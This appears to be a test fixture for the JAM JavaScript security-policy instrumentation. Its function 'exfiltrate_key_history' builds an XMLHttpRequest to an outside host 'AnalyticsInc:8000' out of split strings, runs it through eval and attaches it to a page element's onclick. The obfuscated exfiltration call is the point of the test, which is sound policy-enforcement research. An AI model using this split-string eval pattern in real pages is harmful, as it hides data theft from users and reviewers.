function exfiltrate_key_history() {
  var a = "xmlhttp=new XMLHt";
  var b = "tpRequest();";
  var c = "xmlhttp.op";
  var d = 'en("GET", "http://AnalyticsInc:8000/submission.html?test=concat", true);';
  var e$$4 = "xmlhttp.se";
  var f = "nd(null);";
  var v0 = a + b + c + d + e$$4 + f;
  if(JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + v0 + " }")
  }else {
    JAM.call(eval, null, [v0])
  }
  return
}
JAM.set(JAM.call(JAM.get(document, "getElementById", JAM.policy.pD1B26E82C3C7C4AA5A6D93F7A0110D043B1A982F6FDE2E7025F368C3AE67F96C507DCB6901C6433F9CB8A41433C08E91270D0B4B596856AC65D440B81C0DACAB8A030DE26DF30A320CF2FEB0065B4F71), document, ["test"], JAM.policy.pD1B26E82C3C7C4AA5A6D93F7A0110D043B1A982F6FDE2E7025F368C3AE67F96C507DCB6901C6433F9CB8A41433C08E91270D0B4B596856AC65D440B81C0DACAB8A030DE26DF30A320CF2FEB0065B4F71), "onclick", exfiltrate_key_history, JAM.policy.pAF65661CDDA02BEF577B9796994F429B325DEECD);

